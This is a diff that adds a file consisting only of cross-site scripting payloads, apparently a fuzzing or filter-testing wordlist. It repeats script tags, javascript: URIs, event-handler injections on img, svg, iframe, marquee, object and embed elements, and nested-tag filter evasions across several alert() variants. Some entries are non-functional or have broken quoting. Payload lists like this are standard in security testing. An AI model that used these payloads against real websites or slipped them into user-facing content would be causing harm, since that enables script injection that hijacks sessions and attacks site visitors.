@@ -1,0 +1,93 @@
+<script>alert('XSS');</script>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+<scr<script>ipt>alert('XSS');</scr</script>ipt>
+<a href="javascript:alert('XSS')">Click me</a>
+<img src="x" onerror="alert('XSS')">
+<body onpageshow="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+<form action="javascript:alert('XSS')"><input type="submit"></form>
+<video src="javascript:alert('XSS')"></video>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+<img src=x:alert('XSS')>
+<img src="x:alert('XSS')">
+<img src=`~alert("XSS")`>
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg id=alert('XSS')>
+<svg onload="alert('XSS')">
+<svg/onload="alert('XSS')">
+<svg id="alert('XSS')">
+<marquee onstart=alert('XSS')>
+<marquee onstart="alert('XSS')">
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<script>alert(1)</script>
+<scr<script>ipt>alert(1);</scr</script>ipt>
+<a href="javascript:alert(1)">Click me</a>
+<img src="x" onerror="alert(1)">
+<body onpageshow="alert(1)">
+<iframe src="javascript:alert(1)"></iframe>
+<form action="javascript:alert(1)"><input type="submit"></form>
+<video src="javascript:alert(1)"></video>
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=x:alert(1)>
+<img src="x:alert(1)">
+<img src=`~alert(1)`>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg id=alert(1)>
+<svg onload="alert(1)">
+<svg/onload="alert(1)">
+<svg id="alert(1)">
+<marquee onstart=alert(1)>
+<marquee onstart="alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<script>alert('1')</script>
+<scr<script>ipt>alert('1');</scr</script>ipt>
+<a href="javascript:alert('1')">Click me</a>
+<img src="x" onerror="alert('1')">
+<body onpageshow="alert('1')">
+<iframe src="javascript:alert('1')"></iframe>
+<form action="javascript:alert('1')"><input type="submit"></form>
+<video src="javascript:alert('1')"></video>
+<img src=x onerror=alert('1')>
+<img src=x onerror="alert('1')">
+<img src=x:alert('1')>
+<img src="x:alert('1')">
+<img src=`~alert('1')`>
+<svg onload=alert('1')>
+<svg/onload=alert('1')>
+<svg id=alert('1')>
+<svg onload="alert('1')">
+<svg/onload="alert('1')">
+<svg id="alert('1')">
+<marquee onstart=alert('1')>
+<marquee onstart="alert('1')">
+<object data="javascript:alert('1')">
+<embed src="javascript:alert('1')">
+<script>alert("XSS")</script>
+<scr<script>ipt>alert("XSS");</scr</script>ipt>
+<a href="javascript:alert("XSS")">Click me</a>
+<img src="x" onerror="alert('XSS')">
+<body onpageshow="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+<form action="javascript:alert('XSS')"><input type="submit"></form>
+<video src="javascript:alert('XSS')"></video>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+<img src=x:alert('XSS')>
+<img src="x:alert('XSS')">
+<img src=`~alert("XSS")`>
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg id=alert('XSS')>
+<svg onload="alert('XSS')">
+<svg/onload="alert('XSS')">
+<svg id="alert('XSS')">
+<marquee onstart=alert('XSS')>
+<marquee onstart="alert('XSS')">
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
